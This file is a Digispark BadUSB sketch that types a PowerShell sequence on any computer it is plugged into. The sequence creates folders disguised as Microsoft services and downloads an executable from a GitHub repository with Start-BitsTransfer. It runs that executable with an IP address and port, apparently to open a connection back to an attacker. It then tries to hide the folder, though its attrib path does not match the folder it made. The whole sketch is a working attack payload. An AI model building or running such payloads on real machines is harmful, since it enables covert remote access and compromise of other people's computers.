// Platform: Digispark
// Keyboard Layout: US

#include "DigiKeyboard.h"

// PowerShell
const uint8_t key_arr_0[] PROGMEM = {2,19, 0,18, 0,26, 0,8, 0,21, 2,22, 0,11, 0,8, 0,15, 0,15};
// md c:/Microsoft
const uint8_t key_arr_1[] PROGMEM = {0,16, 0,7, 0,44, 0,6, 2,51, 0,56, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23};
// md c:/Microsoft/Services
const uint8_t key_arr_2[] PROGMEM = {0,16, 0,7, 0,44, 0,6, 2,51, 0,56, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 0,22};
// Start-BitsTransfer -Source https://github.com/Guy-Falk/EthicalHacking/raw/refs/heads/main/ServiceHub.RootHost.zip -Destination c:/Microsoft/Services/ServiceHub.RootHost.exe
const uint8_t key_arr_3[] PROGMEM = {2,22, 0,23, 0,4, 0,21, 0,23, 0,45, 2,5, 0,12, 0,23, 0,22, 2,23, 0,21, 0,4, 0,17, 0,22, 0,9, 0,8, 0,21, 0,44, 0,45, 2,22, 0,18, 0,24, 0,21, 0,6, 0,8, 0,44, 0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,10, 0,12, 0,23, 0,11, 0,24, 0,5, 0,55, 0,6, 0,18, 0,16, 0,56, 2,10, 0,24, 0,28, 0,45, 2,9, 0,4, 0,15, 0,14, 0,56, 2,8, 0,23, 0,11, 0,12, 0,6, 0,4, 0,15, 2,11, 0,4, 0,6, 0,14, 0,12, 0,17, 0,10, 0,56, 0,21, 0,4, 0,26, 0,56, 0,21, 0,8, 0,9, 0,22, 0,56, 0,11, 0,8, 0,4, 0,7, 0,22, 0,56, 0,16, 0,4, 0,12, 0,17, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 2,11, 0,24, 0,5, 0,55, 2,21, 0,18, 0,18, 0,23, 2,11, 0,18, 0,22, 0,23, 0,55, 0,29, 0,12, 0,19, 0,44, 0,45, 2,7, 0,8, 0,22, 0,23, 0,12, 0,17, 0,4, 0,23, 0,12, 0,18, 0,17, 0,44, 0,6, 2,51, 0,56, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 0,22, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 2,11, 0,24, 0,5, 0,55, 2,21, 0,18, 0,18, 0,23, 2,11, 0,18, 0,22, 0,23, 0,55, 0,8, 0,27, 0,8};
// c:/Microsoft/Services/ServiceHub.RootHost -I 172.26.121.169 -P 92
const uint8_t key_arr_4[] PROGMEM = {0,6, 2,51, 0,56, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 0,22, 0,56, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 2,11, 0,24, 0,5, 0,55, 2,21, 0,18, 0,18, 0,23, 2,11, 0,18, 0,22, 0,23, 0,44, 0,45, 2,12, 0,44, 0,30, 0,36, 0,31, 0,55, 0,31, 0,35, 0,55, 0,30, 0,31, 0,30, 0,55, 0,30, 0,35, 0,38, 0,44, 0,45, 2,19, 0,44, 0,38, 0,31};
// attrib +S +H c:/Microsoft.ServiceHub
const uint8_t key_arr_5[] PROGMEM = {0,4, 0,23, 0,23, 0,21, 0,12, 0,5, 0,44, 2,46, 2,22, 0,44, 2,46, 2,11, 0,44, 0,6, 2,51, 0,56, 2,16, 0,12, 0,6, 0,21, 0,18, 0,22, 0,18, 0,9, 0,23, 0,55, 2,22, 0,8, 0,21, 0,25, 0,12, 0,6, 0,8, 2,11, 0,24, 0,5};
// exit
const uint8_t key_arr_6[] PROGMEM = {0,8, 0,27, 0,12, 0,23};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(1000); // DELAY 1000
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(100); // DELAY 100
    DigiKeyboard.sendKeyStroke(42, 0); // BACKSPACE
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING PowerShell
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 1000
    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING md c:/Microsoft
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING md c:/Microsoft/Services
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING Start-BitsTransfer -Source https://gith...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(100); // DELAY 100
    duckyString(key_arr_4, sizeof(key_arr_4)); // STRING c:/Microsoft/Services/ServiceHub.RootHo...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_5, sizeof(key_arr_5)); // STRING attrib +S +H c:/Microsoft.ServiceHub
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    duckyString(key_arr_6, sizeof(key_arr_6)); // STRING exit
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}

void loop() {}

// Created using duckify.huhn.me @ dev 89adab6e